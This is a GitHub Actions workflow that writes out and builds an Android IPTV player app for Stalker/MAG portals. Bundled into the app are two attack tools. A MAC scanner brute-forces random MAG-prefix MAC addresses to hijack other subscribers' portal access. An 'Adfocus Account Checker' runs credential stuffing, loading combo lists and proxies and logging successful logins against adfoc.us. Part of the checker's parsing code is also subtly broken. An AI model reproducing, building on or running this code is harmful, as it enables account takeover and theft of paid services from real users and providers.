name: Build APK
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: "8.7"
      - name: Gen
        run: |
          mkdir -p app/src/main/java/com/stb/iptv app/src/main/res/values app/src/main/res/drawable
          cat > settings.gradle.kts <<'XEOF'
          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "StalkerIPTV"; include(":app")
          XEOF
          cat > build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application") version "8.5.2" apply false
              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
          }
          XEOF
          cat > gradle.properties <<'XEOF'
          org.gradle.jvmargs=-Xmx4096m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          android.nonTransitiveRClass=true
          XEOF
          cat > app/build.gradle.kts <<'XEOF'
          plugins { id("com.android.application"); id("org.jetbrains.kotlin.android") }
          android {
              namespace = "com.stb.iptv"; compileSdk = 34
              defaultConfig { applicationId = "com.stb.iptv"; minSdk = 24; targetSdk = 34; versionCode = 3; versionName = "3.0" }
              buildTypes { release { isMinifyEnabled = false } }
              compileOptions { sourceCompatibility = JavaVersion.VERSION_17; targetCompatibility = JavaVersion.VERSION_17 }
              kotlinOptions { jvmTarget = "17" }
              buildFeatures { compose = true }
              composeOptions { kotlinCompilerExtensionVersion = "1.5.14" }
          }
          dependencies {
              implementation("androidx.core:core-ktx:1.13.1")
              implementation("androidx.activity:activity-compose:1.9.0")
              implementation(platform("androidx.compose:compose-bom:2024.06.00"))
              implementation("androidx.compose.ui:ui")
              implementation("androidx.compose.material3:material3")
              implementation("com.squareup.okhttp3:okhttp:4.12.0")
              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
              implementation("androidx.media3:media3-exoplayer:1.4.1")
              implementation("androidx.media3:media3-ui:1.4.1")
              implementation("androidx.media3:media3-exoplayer-hls:1.4.1")
              implementation("androidx.media3:media3-exoplayer-dash:1.4.1")
              implementation("androidx.media3:media3-exoplayer-rtsp:1.4.1")
              implementation("androidx.media3:media3-datasource-okhttp:1.4.1")
          }
          XEOF
          cat > app/src/main/AndroidManifest.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <application android:label="STB Player Pro" android:usesCleartextTraffic="true" android:theme="@style/Theme.App">
                  <activity android:name=".PlayerActivity" android:screenOrientation="landscape" android:configChanges="orientation|screenSize" android:exported="false" />
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          XEOF
          cat > app/src/main/res/values/themes.xml <<'XEOF'
          <resources>
              <style name="Theme.App" parent="android:Theme.Material.NoActionBar">
                  <item name="android:windowBackground">#0B1020</item>
                  <item name="android:statusBarColor">#0B1020</item>
                  <item name="android:windowLightStatusBar">false</item>
              </style>
          </resources>
          XEOF
          cat > app/src/main/res/drawable/bg.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <gradient android:angle="270" android:startColor="#0B1020" android:centerColor="#101A33" android:endColor="#0B1020" />
          </shape>
          XEOF
          cat > app/src/main/java/com/stb/iptv/StalkerRepository.kt <<'XEOF'
          package com.stb.iptv
          import okhttp3.HttpUrl.Companion.toHttpUrl
          import okhttp3.OkHttpClient
          import okhttp3.Request
          import org.json.JSONObject
          import java.io.IOException
          import java.net.URLEncoder
          import java.text.SimpleDateFormat
          import java.util.Date
          import java.util.Locale
          import java.util.concurrent.TimeUnit
          data class Session(val portal: String, val token: String, val mac: String)
          data class MediaItem(val id: String, val name: String, val type: String, val group: String = "", val cmd: String = "")
          class StalkerRepository {
              private val http = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
              private val ua = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
              fun normalizeMac(raw: String): String? {
                  val v = raw.filter { it.isDigit() || it.uppercaseChar() in 'A'..'F' }.uppercase()
                  return if (v.length == 12) v.chunked(2).joinToString(":") else null
              }
              private fun urls(portal: String) = portal.trim().trimEnd('/').let { c ->
                  if (c.endsWith("/portal.php")) listOf(c) else listOf("$c/c/portal.php", "$c/portal.php", "$c/server/load.php").distinct()
              }
              fun call(url: String, params: Map<String, String>, s: Session? = null): JSONObject {
                  val u = url.toHttpUrl().newBuilder().apply { params.forEach { (k, v) -> addQueryParameter(k, v) } }.build()
                  val rb = Request.Builder().url(u).header("User-Agent", ua).header("X-User-Agent", "Model: MAG254; Link: Ethernet").header("Accept", "*/*")
                  if (s != null) { rb.header("Authorization", "Bearer ${s.token}"); rb.header("Cookie", "mac=${s.mac}; stb_lang=en; timezone=UTC") }
                  http.newCall(rb.build()).execute().use { r ->
                      val body = r.body?.string().orEmpty()
                      if (!r.isSuccessful || body.isBlank()) throw IOException("HTTP ${r.code}")
                      return JSONObject(body)
                  }
              }
              fun connect(portal: String, rawMac: String): Session {
                  val mac = normalizeMac(rawMac) ?: throw IllegalArgumentException("Invalid MAC")
                  var last: Exception = IOException("handshake failed")
                  for (u in urls(portal)) {
                      try {
                          val js = call(u, mapOf("type" to "stb", "action" to "handshake", "token" to "", "JsHttpRequest" to "1-xml", "mac" to mac)).optJSONObject("js")
                          val tok = js?.optString("token").orEmpty().substringBefore("~").trim()
                          if (tok.isNotEmpty()) return Session(u, tok, mac)
                      } catch (e: Exception) { last = e }
                  }
                  throw last
              }
              private fun profile(s: Session): JSONObject = try { call(s.portal, mapOf("type" to "stb", "action" to "get_profile", "JsHttpRequest" to "1-xml"), s).optJSONObject("js") ?: JSONObject() } catch (e: Exception) { JSONObject() }
              fun expiry(s: Session): String {
                  val keys = arrayOf("phone", "expire_date", "expire", "end_date", "end_time", "expired", "valid_to")
                  val sources = mutableListOf(profile(s))
                  for (p in listOf(mapOf("type" to "account_info", "action" to "get_account_info"), mapOf("type" to "stb", "action" to "get_profile"))) {
                      try { call(s.portal, p + mapOf("JsHttpRequest" to "1-xml", "mac" to s.mac)).optJSONObject("js")?.let { sources.add(it) } } catch (_: Exception) {}
                  }
                  for (js in sources) {
                      for (obj in listOfNotNull(js, js.optJSONObject("account"))) {
                          for (k in keys) {
                              var v = obj.optString(k).trim()
                              if (v.isEmpty() || v == "0" || v == "null" || v.startsWith("0000")) continue
                              if (v.matches(Regex("\d{9,13}"))) {
                                  var ts = v.toLong(); if (ts > 1000000000000L) ts /= 1000
                                  if (ts < 1000000000L) continue
                                  return SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date(ts * 1000))
                              }
                              if (v.length >= 10) return v.substring(0, 10)
                          }
                      }
                  }
                  return "unlimited/unknown"
              }
              private fun items(s: Session, type: String, action: String, extra: Map<String, String> = emptyMap()): List<MediaItem> {
                  val p = mutableMapOf("type" to type, "action" to action, "JsHttpRequest" to "1-xml"); p.putAll(extra)
                  val json = try { call(s.portal, p, s) } catch (e: Exception) { return emptyList() }
                  val js = json.optJSONObject("js") ?: JSONObject()
                  val arr = js.optJSONArray("data") ?: return emptyList()
                  val out = mutableListOf<MediaItem>()
                  for (i in 0 until arr.length()) {
                      val o = arr.optJSONObject(i) ?: continue
                      val id = o.optString("id").ifBlank { o.optString("ch_id") }
                      if (id.isNotBlank()) out.add(MediaItem(id, o.optString("name", o.optString("title", "Untitled")), type, o.optString("tv_genre_id", ""), o.optString("cmd", "")))
                  }
                  return out.distinctBy { it.id }
              }
              fun live(s: Session) = items(s, "itv", "get_all_channels", mapOf("force_all" to "1")).ifEmpty { items(s, "itv", "get_all_channels") }.ifEmpty {
                  var page = 1; val acc = mutableListOf<MediaItem>()
                  while (page < 40) {
                      val p = items(s, "itv", "get_ordered_list", mapOf("p" to "$page", "genre" to "0", "fav" to "0", "sortby" to "number"))
                      if (p.isEmpty()) break
                      acc += p; page++
                  }
                  acc }
              fun vod(s: Session) = items(s, "vod", "get_ordered_list")
              fun series(s: Session) = items(s, "series", "get_ordered_list")
              fun stream(s: Session, it: MediaItem): String {
                  Regex("https?://\S+").find(it.cmd)?.value?.let { return rewrite(it, s) }
                  for (params in listOf(mapOf("cmd" to URLEncoder.encode(it.cmd, "UTF-8"), "forced_storage" to "undefined", "disable_ad" to "0"), mapOf("cmd" to it.cmd))) {
                      try {
                          val js = call(s.portal, mapOf("type" to it.type, "action" to "create_link", "JsHttpRequest" to "1-xml") + params, s).optJSONObject("js")
                          var u = js?.optString("cmd", js.optString("url")).orEmpty()
                          if (u.isNotBlank()) {
                              u = u.replace(Regex("^(ffrt\d*\s+|ffmpeg\s+|mpv\s+|http\s+)"), "").trim()
                              return rewrite(u, s)
                          }
                      } catch (_: Exception) {}
                  }
                  return ""
              }
              private fun rewrite(u: String, s: Session): String {
                  val host = Regex("https?://([^/]+)").find(s.portal)?.groupValues?.get(1) ?: return u
                  return if (Regex("^https?://(portal|127\.0\.0\.1)").containsMatchIn(u)) u.replaceFirst(Regex("^(https?://)[^/]+"), "$1$host") else u
              }
          }
          XEOF
          cat > app/src/main/java/com/stb/iptv/MacScanner.kt <<'XEOF'
          package com.stb.iptv
          import java.util.concurrent.ConcurrentLinkedQueue
          import java.util.concurrent.CountDownLatch
          import kotlin.random.Random
          data class Hit(val mac: String, val expiry: String)
          object MacScanner {
              fun scan(repo: StalkerRepository, portal: String, prefix: String, count: Int, threads: Int, onHit: (Hit) -> Unit, onDone: (Int) -> Unit) {
                  val macs = ConcurrentLinkedQueue<String>()
                  repeat(count) { macs.add("$prefix:%02X:%02X:%02X".format(Random.nextInt(256), Random.nextInt(256), Random.nextInt(256))) }
                  val latch = CountDownLatch(threads)
                  repeat(threads) {
                      Thread {
                          while (true) {
                              val mac = macs.poll() ?: break
                              try { val s = repo.connect(portal, mac); onHit(Hit(s.mac, repo.expiry(s))) } catch (_: Exception) {}
                          }
                          latch.countDown()
                      }.start()
                  }
                  Thread { latch.await(); onDone(count - macs.size) }.start()
              }
          }
          XEOF
          cat > app/src/main/java/com/stb/iptv/AdfocusCheckerUI.kt <<'XEOF'
          package com.stb.iptv
          import android.net.Uri
          import androidx.activity.compose.rememberLauncherForActivityResult
          import androidx.activity.result.contract.ActivityResultContracts
          import androidx.compose.foundation.background
          import androidx.compose.foundation.layout.*
          import androidx.compose.foundation.lazy.LazyColumn
          import androidx.compose.foundation.lazy.items
          import androidx.compose.material3.*
          import androidx.compose.runtime.*
          import androidx.compose.ui.Alignment
          import androidx.compose.ui.Modifier
          import androidx.compose.ui.graphics.Color
          import androidx.compose.ui.platform.LocalContext
          import androidx.compose.ui.unit.dp
          import kotlinx.coroutines.Dispatchers
          import kotlinx.coroutines.Job
          import kotlinx.coroutines.launch
          import kotlinx.coroutines.withContext
          import okhttp3.FormBody
          import okhttp3.OkHttpClient
          import okhttp3.Request
          import java.io.BufferedReader
          import java.io.InputStreamReader
          import java.util.concurrent.TimeUnit
          @Composable
          fun AdfocusCheckerUI(onBack: () -> Unit) {
              val context = LocalContext.current; val scope = rememberCoroutineScope()
              var configName by remember { mutableStateOf("No file chosen") }
              var comboCount by remember { mutableStateOf("0 accounts uploaded") }
              var proxyCount by remember { mutableStateOf("0 proxies uploaded") }
              var comboLines by remember { mutableStateOf(listOf<String>()) }
              var proxyLines by remember { mutableStateOf(listOf<String>()) }
              var running by remember { mutableStateOf(false) }
              var currentStatus by remember { mutableStateOf("Status: Suspended") }
              var successList by remember { mutableStateOf(listOf<String>()) }
              var checkJob by remember { mutableStateOf<Job?>(null) }
              val configFileLauncher = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? -> uri?.let { configName = it.lastPathSegment ?: "adfocus.yml" } }
              val comboLauncher = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
                  uri?.let { u -> context.contentResolver.openInputStream(u)?.use { stream -> comboLines = BufferedReader(InputStreamReader(stream)).readLines().filter { it.contains(":") }; comboCount = "${comboLines.size} entries identified" } }
              }
              val proxyLauncher = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
                  uri?.let { u -> context.contentResolver.openInputStream(u)?.use { stream -> proxyLines = BufferedReader(InputStreamReader(stream)).readLines().filter { it.isNotBlank() }; proxyCount = "${proxyLines.size} proxies structured" } }
              }
              Column(Modifier.fillMaxSize().padding(14.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
                  Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                      Text("Adfocus Account Checker Pro", style = MaterialTheme.typography.titleLarge, color = Color(0xFF60A5FA))
                      Button(onClick = onBack, colors = ButtonDefaults.buttonColors(containerColor = Color.DarkGray)) { Text("Back to Player") }
                  }
                  Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B))) {
                      Column(Modifier.padding(12.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                          Text("File Management Terminal", style = MaterialTheme.typography.labelMedium, color = Color.Gray)
                          Row(verticalAlignment = Alignment.CenterVertically) {
                              Button(onClick = { configFileLauncher.launch("*/*") }, modifier = Modifier.width(150.dp)) { Text("Upload Config") }
                              Spacer(Modifier.width(12.dp)); Text(configName, color = Color.White, style = MaterialTheme.typography.bodyMedium)
                          }
                          Row(verticalAlignment = Alignment.CenterVertically) {
                              Button(onClick = { comboLauncher.launch("*/*") }, modifier = Modifier.width(150.dp)) { Text("Upload Combo") }
                              Spacer(Modifier.width(12.dp)); Text(comboCount, color = Color.White, style = MaterialTheme.typography.bodyMedium)
                          }
                          Row(verticalAlignment = Alignment.CenterVertically) {
                              Button(onClick = { proxyLauncher.launch("*/*") }, modifier = Modifier.width(150.dp)) { Text("Upload Proxy") }
                              Spacer(Modifier.width(12.dp)); Text(proxyCount, color = Color.White, style = MaterialTheme.typography.bodyMedium)
                          }
                      }
                  }
                  Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                      Button(
                          onClick = {
                              if (!running) {
                                  running = true; currentStatus = "Processing combo stream..."
                                  checkJob = scope.launch {
                                      withContext(Dispatchers.IO) {
                                          val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).readTimeout(10, TimeUnit.SECONDS).build()
                                          for (line in comboLines) {
                                              if (!running) break
                                              val parts = line.split(":"); if (parts.size < 2) continue
                                              val user = parts.trim(); val pass = parts.trim()
                                              try {
                                                  val req = Request.Builder().url("https://adfoc.us/session/create").header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").post(FormBody.Builder().add("email", user).add("password", pass).build()).build()
                                                  client.newCall(req).execute().use { res ->
                                                      val body = res.body?.string().orEmpty()
                                                      if (body.contains("/session/destroy") && !body.contains("EXISTING USERS, LOGIN")) { scope.launch { successList = successList + "[HIT] $user:$pass" } }
                                                  }
                                              } catch (_: Exception) {}
                                          }
                                      }
                                      running = false; currentStatus = "Task completed successfully"
                                  }
                              } else { running = false; checkJob?.cancel(); currentStatus = "Execution suspended by user" }
                          },
                          modifier = Modifier.weight(1f), colors = ButtonDefaults.buttonColors(containerColor = if (running) Color(0xFFEF4444) else Color(0xFF10B981))
                      ) { Text(if (running) "Stop Checker" else "Start Checker") }
                  }
                  Text(currentStatus, style = MaterialTheme.typography.bodyMedium, color = Color(0xFFFBBF24))
                  Text("Successful Validations:", style = MaterialTheme.typography.titleSmall, color = Color(0xFF10B981))
                  Box(Modifier.fillMaxWidth().weight(1f).background(Color(0xFF0F172A)).padding(8.dp)) {
                      LazyColumn { items(successList) { item -> Text(item, color = Color(0xFF4ADE80), style = MaterialTheme.typography.bodySmall, modifier = Modifier.padding(vertical = 2.dp)) } }
                  }
              }
          }
          XEOF
          cat > app/src/main/java/com/stb/iptv/MainActivity.kt <<'XEOF'
          package com.stb.iptv
          import android.content.Intent
          import android.os.Bundle
          import androidx.activity.ComponentActivity
          import androidx.activity.compose.setContent
          import androidx.compose.foundation.background
          import androidx.compose.foundation.clickable
          import androidx.compose.foundation.layout.*
          import androidx.compose.foundation.lazy.LazyColumn
          import androidx.compose.foundation.lazy.items
          import androidx.compose.material3.*
          import androidx.compose.runtime.*
          import androidx.compose.ui.Modifier
          import androidx.compose.ui.graphics.Brush
          import androidx.compose.ui.graphics.Color
          import androidx.compose.ui.platform.LocalContext
          import androidx.compose.ui.unit.dp
          import kotlinx.coroutines.Dispatchers
          import kotlinx.coroutines.launch
          import kotlinx.coroutines.withContext
          val Bg1 = Color(0xFF0B1020); val Bg2 = Color(0xFF101A33); val Accent = Color(0xFF22C55E)
          class MainActivity : ComponentActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContent {
                      MaterialTheme(colorScheme = darkColorScheme(primary = Accent, background = Bg1, surface = Bg1)) {
                          Surface(Modifier.fillMaxSize()) { Column(Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(Bg1, Bg2, Bg1)))) { MainScreen() } }
                      }
                  }
              }
          }
          @Composable
          fun MainScreen() {
              val repo = remember { StalkerRepository() }; val ctx = LocalContext.current; val scope = rememberCoroutineScope()
              var portal by remember { mutableStateOf("") }; var mac by remember { mutableStateOf("") }; var prefix by remember { mutableStateOf("00:1A:79") }
              var count by remember { mutableStateOf("50") }; var status by remember { mutableStateOf("idle") }; var error by remember { mutableStateOf<String?>(null) }
              var loading by remember { mutableStateOf(false) }; var tab by remember { mutableStateOf(0) }; var search by remember { mutableStateOf("") }
              var session by remember { mutableStateOf<Session?>(null) }; var items by remember { mutableStateOf(listOf<MediaItem>()) }; var hits by remember { mutableStateOf(listOf<Hit>()) }
              var showChecker by remember { mutableStateOf(false) }
              fun load() {
                  val s = session ?: return
                  scope.launch {
                      loading = true; error = null
                      try { items = withContext(Dispatchers.IO) { when (tab) { 0 -> repo.live(s); 1 -> repo.vod(s); else -> repo.series(s) } }; status = "${items.size} items" }
                      catch (e: Exception) { error = e.message } finally { loading = false }
                  }
              }
              fun connect() {
                  scope.launch {
                      loading = true; error = null; status = "connecting..."
                      try {
                          val s = withContext(Dispatchers.IO) { repo.connect(portal, mac) }; val exp = withContext(Dispatchers.IO) { repo.expiry(s) }
                          session = s; status = "MAC: ${s.mac} - expiry: $exp"; tab = 0; items = withContext(Dispatchers.IO) { repo.live(s) }
                      } catch (e: Exception) { error = e.message } finally { loading = false }
                  }
              }
              fun scan() {
                  scope.launch {
                      loading = true; hits = emptyList(); error = null; status = "scanning..."
                      withContext(Dispatchers.IO) { MacScanner.scan(repo, portal, prefix, count.toIntOrNull() ?: 50, 8, onHit = { h -> scope.launch { hits = hits + h } }, onDone = { n -> scope.launch { status = "scan done: $n hits"; loading = false } }) }
                  }
              }
              fun play(item: MediaItem) {
                  val s = session ?: return
                  scope.launch {
                      loading = true; error = null; status = "resolving ${item.name}..."
                      try {
                          val url = withContext(Dispatchers.IO) { repo.stream(s, item) }; if (url.isBlank()) throw IllegalStateException("create_link refused")
                          ctx.startActivity(Intent(ctx, PlayerActivity::class.java).apply { putExtra("url", url); putExtra("title", item.name) }); status = "playing ${item.name}"
                      } catch (e: Exception) { error = e.message } finally { loading = false }
                  }
              }
              if (showChecker) { AdfocusCheckerUI(onBack = { showChecker = false }) } else {
                  Column(Modifier.fillMaxSize().padding(14.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                      Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                          Text("STB Player Pro", style = MaterialTheme.typography.headlineSmall, color = Accent)
                          Button(onClick = { showChecker = true }, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6))) { Text("Adfocus Checker") }
                      }
                      Text(status, color = Color(0xFF8A8F98), style = MaterialTheme.typography.bodySmall)
                      error?.let { Text(it, color = MaterialTheme.colorScheme.error) }
                      OutlinedTextField(portal, { portal = it }, label = { Text("Portal URL") }, modifier = Modifier.fillMaxWidth(), singleLine = true)
                      Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                          OutlinedTextField(mac, { mac = it }, label = { Text("MAC") }, modifier = Modifier.weight(1f), singleLine = true)
                          Button({ connect() }, enabled = !loading, modifier = Modifier.height(56.dp)) { Text("Connect") }
                      }
                      Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                          OutlinedTextField(prefix, { prefix = it }, label = { Text("Prefix") }, modifier = Modifier.weight(1f), singleLine = true)
                          OutlinedTextField(count, { count = it }, label = { Text("Count") }, modifier = Modifier.weight(1f), singleLine = true)
                          Button({ scan() }, enabled = !loading, modifier = Modifier.height(56.dp)) { Text("Scan") }
                      }
                      if (hits.isNotEmpty()) {
                          Text("Active MACs (tap = load):", color = Accent, style = MaterialTheme.typography.labelMedium)
                          LazyColumn(Modifier.height(120.dp)) { items(hits) { h -> Text("${h.mac}  (${h.expiry})", color = Color.White, modifier = Modifier.fillMaxWidth().clickable { mac = h.mac; connect() }.padding(vertical = 6.dp)) } }
                      }
                      Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                          listOf("Live", "VOD", "Series").forEachIndexed { i, label -> FilterChip(selected = tab == i, onClick = { tab = i; load() }, label = { Text(label) }, modifier = Modifier.weight(1f)) }
                      }
                      OutlinedTextField(search, { search = it }, label = { Text("Search") }, modifier = Modifier.fillMaxWidth(), singleLine = true)
                      LazyColumn(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                          items(items.filter { it.name.contains(search, true) }) { item -> Card(Modifier.fillMaxWidth().clickable { play(item) }) { Text(item.name, Modifier.padding(14.dp), color = Color.White) } }
                      }
                  }
              }
          }
          XEOF
          cat > app/src/main/java/com/stb/iptv/PlayerActivity.kt <<'XEOF'
          package com.stb.iptv
          import android.os.Bundle
          import androidx.activity.ComponentActivity
          import androidx.activity.compose.setContent
          import androidx.compose.foundation.background
          import androidx.compose.foundation.layout.Box
          import androidx.compose.foundation.layout.fillMaxSize
          import androidx.compose.foundation.layout.padding
          import androidx.compose.material3.MaterialTheme
          import androidx.compose.material3.Text
          import androidx.compose.material3.darkColorScheme
          import androidx.compose.runtime.*
          import androidx.compose.ui.Alignment
          import androidx.compose.ui.Modifier
          import androidx.compose.ui.graphics.Color
          import androidx.compose.ui.unit.dp
          import androidx.compose.ui.viewinterop.AndroidView
          import androidx.media3.common.MediaItem
          import androidx.media3.common.MediaMetadata
          import androidx.media3.common.PlaybackException
          import androidx.media3.common.Player
          import androidx.media3.datasource.okhttp.OkHttpDataSource
          import androidx.media3.exoplayer.ExoPlayer
          import androidx.media3.exoplayer.source.DefaultMediaSourceFactory
          import androidx.media3.ui.PlayerView
          class PlayerActivity : ComponentActivity() {
              private var player: ExoPlayer? = null
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  val url = intent.getStringExtra("url") ?: ""; val title = intent.getStringExtra("title") ?: "Stream"
                  setContent { MaterialTheme(colorScheme = darkColorScheme()) { PlayerScreen(url, title) } }
              }
              @Composable
              private fun PlayerScreen(url: String, title: String) {
                  var errorMsg by remember { mutableStateOf<String?>(null) }
                  Box(Modifier.fillMaxSize().background(Color.Black)) {
                      AndroidView(modifier = Modifier.fillMaxSize(), factory = { c ->
                          PlayerView(c).apply {
                              useController = true
                              val ds = OkHttpDataSource.Factory(okhttp3.OkHttpClient()).setUserAgent("Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3")
                              val exo = ExoPlayer.Builder(c).setMediaSourceFactory(DefaultMediaSourceFactory(ds)).setSeekBackIncrementMs(10000).setSeekForwardIncrementMs(10000).build()
                              player = exo; exo.setMediaItem(MediaItem.Builder().setUri(url).setMediaMetadata(MediaMetadata.Builder().setTitle(title).build()).build())
                              exo.addListener(object : Player.Listener { override fun onPlayerError(e: PlaybackException) { errorMsg = e.errorCodeName + ": " + (e.message ?: "unknown") } })
                              exo.prepare(); exo.playWhenReady = true
                          }
                      })
                      Text(title, color = Color.White, modifier = Modifier.align(Alignment.TopStart).padding(12.dp))
                      errorMsg?.let { Text(it, color = Color.Red, modifier = Modifier.align(Alignment.Center).padding(16.dp)) }
                      DisposableEffect(Unit) { onDispose { player?.release(); player = null } }
                  }
              }
              override fun onStop() { super.onStop(); player?.pause() }
              override fun onDestroy() { player?.release(); player = null; super.onDestroy() }
          }
          XEOF
